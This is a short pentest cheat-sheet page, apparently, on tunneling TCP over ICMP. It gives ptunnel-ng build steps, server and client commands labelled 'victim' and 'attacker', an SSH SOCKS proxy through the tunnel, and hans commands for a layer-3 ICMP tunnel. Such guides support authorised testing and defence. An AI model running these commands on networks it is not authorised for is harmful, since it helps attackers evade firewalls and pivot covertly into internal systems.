---
title: "ICMP Tunneling"
---

# 📡 ICMP Tunneling

> Tunnel TCP traffic over ICMP echo packets (ping).
> Useful when ICMP is allowed but other protocols are filtered.

::: tip 📖 How it works?
ICMP echo requests (ping) are often allowed outbound for diagnostics. Tools encapsulate TCP inside ICMP packets.
:::

## 🐧 ptunnel-ng – ICMP tunnel

::: details Installation

```bash
git clone https://github.com/utoni/ptunnel-ng.git
cd ptunnel-ng
./autogen.sh
./configure --enable-static
make
```

:::

### Server (pivot host – victim)

```bash
# Relay incoming ICMP traffic to local SSH (port 22)
sudo ./ptunnel-ng -r $PIVOT_HOST -R 22
```

### Client (attacker)

```bash
# Create local port 2222 that tunnels ICMP to pivot's SSH
sudo ./ptunnel-ng -p $PIVOT_HOST -l 2222 -R 22
```

### Use the tunnel (SSH over ICMP)

```bash
# Connect through the ICMP tunnel (port 2222)
ssh -D $SOCKS_PORT -p 2222 $PIVOT_USER@127.0.0.1
```

Now you have a SOCKS proxy over ICMP.

### Diagram

```bash
[Attacker] --ICMP--> [Pivot Host] --TCP--> [Internal Target]
    |                    |
    | ptunnel-ng -p      | ptunnel-ng -r
    | local:2222         | relays to SSH:22
    |
    ssh -p 2222 --> SOCKS proxy
```

### 🧪 hans

> Creates a TUN interface (layer 3). Less common but useful for VPN-like connectivity.

```bash
# Server (attacker)
sudo hans -v -s $LHOST -p $SECRET_KEY

# Client (victim)
sudo hans -v -c $LHOST -p $SECRET_KEY -g $GATEWAY_IP
```
